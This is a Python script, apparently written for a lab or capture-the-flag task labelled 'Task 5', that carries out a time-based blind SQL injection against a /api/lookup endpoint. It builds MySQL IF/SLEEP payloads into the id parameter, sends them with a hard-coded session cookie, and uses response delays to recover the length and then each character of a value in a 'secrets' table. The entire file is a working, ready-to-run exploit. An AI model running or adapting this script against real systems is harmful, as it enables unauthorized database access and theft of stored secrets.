#!/usr/bin/env python3
"""
Task 5 - Time-based blind SQLi extraction
Extracts secrets.value WHERE kind='time' from /api/lookup?id=
"""
import requests
import string
import time

BASE_URL = "http://10.42.171.46/api/lookup"
COOKIE = {"session": "eyJ1aWQiOjF9.anQ8RA.B3Mq2CkZ4odE1siITwLBFAHXm-8"}
SLEEP_TIME = 3          # seconds injected on TRUE
THRESHOLD = 1.5         # clearly above noise, clearly below SLEEP_TIME
CHARSET = string.ascii_uppercase  # adjust if lowercase/digits needed
MAX_LEN = 20            # safety cap on string length

def check_char(position: int, char: str) -> bool:
    """Returns True if the char at `position` (1-indexed) equals `char`."""
    payload = (
        f"1 AND IF((SELECT SUBSTRING(value,{position},1) "
        f"FROM secrets WHERE kind='time')='{char}',SLEEP({SLEEP_TIME}),0)"
    )
    start = time.time()
    requests.get(BASE_URL, params={"id": payload}, cookies=COOKIE, timeout=10)
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_length() -> int:
    """Binary-search-free simple length probe (loop, since length is short)."""
    for length in range(1, MAX_LEN + 1):
        payload = (
            f"1 AND IF((SELECT LENGTH(value) FROM secrets "
            f"WHERE kind='time')={length},SLEEP({SLEEP_TIME}),0)"
        )
        start = time.time()
        requests.get(BASE_URL, params={"id": payload}, cookies=COOKIE, timeout=10)
        elapsed = time.time() - start
        if elapsed >= THRESHOLD:
            return length
    return 0

def extract_value(length: int) -> str:
    result = ""
    for pos in range(1, length + 1):
        found = None
        for char in CHARSET:
            if check_char(pos, char):
                found = char
                break
        if found is None:
            print(f"[!] Position {pos}: no match found, stopping.")
            break
        result += found
        print(f"[+] Position {pos}: '{found}'  -> so far: {result}")
    return result

if __name__ == "__main__":
    print("[*] Probing length of secrets.value WHERE kind='time' ...")
    length = get_length()
    print(f"[*] Length = {length}")
    if length == 0:
        print("[!] Could not determine length, check threshold/payload.")
    else:
        print("[*] Extracting characters ...")
        value = extract_value(length)
        print(f"\n[RESULT] secrets.value (kind='time') = {value}")
